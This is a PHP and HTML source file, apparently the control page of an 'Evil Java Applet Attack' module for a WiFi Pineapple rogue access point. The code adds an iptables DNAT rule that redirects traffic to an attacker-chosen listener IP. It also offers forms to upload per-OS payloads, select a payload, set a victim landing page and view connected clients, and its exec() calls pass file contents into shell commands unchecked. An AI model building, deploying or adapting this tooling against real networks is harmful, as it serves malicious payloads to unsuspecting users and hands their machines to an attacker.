<?php 
//update iptables
$listener_ip=exec('cat listener_ip.txt');
echo exec("iptables -t nat -A OUTPUT -d 1.3.3.7 -j DNAT --to-destination $listener_ip");
?>
<html>
<head>
<title>Pineapple Control Center</title>
</head>
<body bgcolor="black" text="white" alink="green" vlink="green" link="green">
<pre>
<center>
<font style="color:white; font-size:20px;"><a style="color:#666;">&#9763;</a><b> Evil Java Applet Attack </b><a style="color:#666;">&#9763;</a></font>
<table id="conf" border="0"><tr><td align="left" valign="top"><pre><b>
<font color="white">
88888888888888888888888888888888888888888888888888888888888888888888888
88.._|      | `-.  | `.  -_-_ _-_  _-  _- -_ -  .'|   |.'|     |  _..88
88   `-.._  |    |`!  |`.  -_ -__ -_ _- _-_-  .'  |.;'   |   _.!-'|  88
88      | `-!._  |  `;!  ;. _______________ ,'| .-' |   _!.i'     |  88
88..__  |     |`-!._ | `.| |_______________||."'|  _!.;'   |     _|..88
88   |``"..__ |    |`";.| i|_|MMMMMMMMMMM|_|'| _!-|   |   _|..-|'    88
88   |      |``--..|_ | `;!|@|MMoMMMMoMMM|@|.'j   |_..!-'|     |     88
88   |      |    |   |`-,!_|_|MMMMP'YMMMM|_||.!-;'  |    |     |     88
88___|______|____!.,.!,.!,!|E|MMMo <a style="color:white; text-decoration: none;" href="javascript:alert('&#9760; ... Evil Java is evil, muhahaha ... &#9760;');">*</a> loMM|J|,!,.!.,.!..__|_____|_____88
88      |     |    |  |  | |_|MMMMb,dMMMM|_|| |   |   |    |      |  88
88      |     |    |..!-;'i|v|MPYMoMMMMoM|a| |`-..|   |    |      |  88
88      |    _!.-j'  | _!,"|_|M)(MMMMoMMM|_||!._|  `i-!.._ |      |  88
88     _!.-'|    | _."|  !;|i|MbdMMoMMMMM|v|`.| `-._|    |``-.._  |  88
88..-i'     |  _.''|  !-| !|_|MMMoMMMMoMM|_|.|`-. | ``._ |     |``"..88
88   |      |.|    |.|  !| |l|MoMMMMoMMMM|a||`. |`!   | `".    |     88
88   |  _.-'  |  .'  |.' |/|_|MMMMoMMMMoM|_|! |`!  `,.|    |-._|     88
88  _!"'|     !.'|  .'| .'|[@]MMMMMMMMMMM[@] \|  `. | `._  |   `-._  88
88-'    |   .'   |.|  |/| /                 \|`.  |`!    |.|      |`-88
88      |_.'|   .' | .' |/                   \  \ |  `.  | `._    |  88
88     .'   | .'   |/|  /                     \ |`!   |`.|    `.  |  88
88  _.'     !'|   .' | /                       \|  `  |  `.    |`.|  88
8888888888888888888888888888888888888888888888888888888888888888 fL 888
</b></pre>
<div id="options" align="center">
<p> Upload custom payload: <a href="javascript:windows();">[ Windows ]</a> <a href="javascript:mac();">[ Mac ]</a> <a href="javascript:linux();">[ Linux ]</a> <a href="javascript:other();">[ Other ]</a></p>
<form action="upload_payload.php" id="upload" style="display:none;" method="post" enctype="multipart/form-data">
<label for="file">Select Payload:</label>
<input type="file" name="file" id="file" style="border: 1px white dotted; border-radius:4px;"/>
<input name="os" id="os" style="display:none;" />
<input type="submit" name="submit" value="Upload" />
</form>
<p><form method="POST" id="form_land_page" action="land_page.php"> Landing Page: <input name="land_page" size="25" style="border-radius:4px; background-color:black; color:white; border: 1px white dotted;" value="<?php echo exec('cat /www/java/redirect');?>"/>  <a href="javascript:document.forms['form_land_page'].submit()"/>[ Update ]</a></form></p>
<p><form method="POST" id="form_listener_ip" action="listener_ip.php"> Listener ip: <input name="listener_ip" size="13" style="border-radius:4px; background-color:black; color:white; border: 1px white dotted;" value="<?php /*echo exec('cat listener_ip.txt');*/?>Doesn't work yet"/>  <a href="javascript:document.forms['form_listener_ip'].submit()"/>[ Update ]</a></form></p>
<p>Select Paylaod: <a href="javascript:show_payloads();">[ Select ]</a></p>
<p>Help: <a href="javascript:show_help();">[ Show ]</a></p>
</td></tr></table>
</div>
</pre>
<?php
require('payload_table.php');
if (exec('cat sync_get') == 'yes') {
echo "<br />";
require('clients.php');
}
?>
<div id="defaults" style="display:none;">
<?
require('defaults.php');
?>
</div>

</body>
</html>
<style> 
#conf a {text-decoration: none; font-weight:bold;}
</style>


<script>
function show_help() {
document.getElementById('defaults').style.display='block';
}
function show_payloads(){
	document.getElementById('payloads').style.display="block";
}
function windows(){
	document.getElementById('upload').style.display="block";
	document.getElementById('os').value="Win";
}
function mac(){
        document.getElementById('upload').style.display="block";
        document.getElementById('os').value="Mac";
}
function linux(){
        document.getElementById('upload').style.display="block";
        document.getElementById('os').value="Nix";
}
function other(){
        document.getElementById('upload').style.display="block";
        document.getElementById('os').value="Other";
}
</script>
 <?php 
if (!is_dir('/www/java')) {
	echo '<script> document.getElementById("options").innerHTML = "<font style=\'color:red;\'><b>[!]</b> Please install Evil Java in order to use these options!</font>";</script>';
} 
?>
